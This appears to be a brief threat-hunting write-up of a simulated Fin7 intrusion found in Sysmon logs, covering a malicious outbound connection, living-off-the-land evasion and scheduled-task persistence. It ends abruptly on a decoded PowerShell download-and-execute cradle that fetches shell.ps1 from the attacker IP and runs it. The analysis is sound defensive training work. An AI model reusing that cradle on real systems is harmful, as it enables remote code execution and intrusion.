🔍 Fin7 Threat Hunt – Sysmon Log Analysis



📌 Overview
This project simulates a real-world SOC investigation where a threat intelligence alert flagged communication with a known malicious IP (**192.168.10.45**) associated with Fin7 activity.

Despite the alert, no action was taken by the EDR, requiring manual log analysis to uncover the attack.

🎯 Objectives
- Identify the initial point of compromise  
- Detect persistence mechanisms  
- Analyze attacker payload and intent  

---
🛠️ Tools Used
- Visual Studio Code (JSON Viewer)
- CyberChef (Base64 Decoding)
- Sysmon Logs

---
🔬 Investigation Process

 🔹 Step 1: Log Preparation
The Sysmon JSON dataset was initially compressed.  
It was formatted using VS Code to improve readability and enable effective analysis.

---

🔹 Step 2: Identify Suspicious Network Activity
Using search functionality, the malicious IP was located:

- **IP Address:** 192.168.10.45  
- **Port:** 80 (HTTP)  
- **Event Type:** NetworkConnection (Event ID 3)  

This revealed an outbound connection from a system process to a known malicious endpoint.

📸  
![Network Connection](screenshots/network_connection.png)

---

 🔹 Step 3: Defense Evasion Technique
The attacker avoided detection by using **Living-off-the-Land (LotL) techniques**, leveraging legitimate system binaries.

- Use of trusted tools reduced antivirus detection
- Activity blended with normal system operations



---
 🔹 Step 4: Persistence Mechanism
Persistence was established using **Windows Scheduled Tasks** via `schtasks.exe`.

- The task was configured to run every **30 minutes**
- Ensures continued execution after reboot




 🔹 Step 5: PowerShell Payload (Obfuscated)
A suspicious PowerShell command was identified using Base64 encoding.





### 🔓 Decoded Payload

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.10.45/shell.ps1')
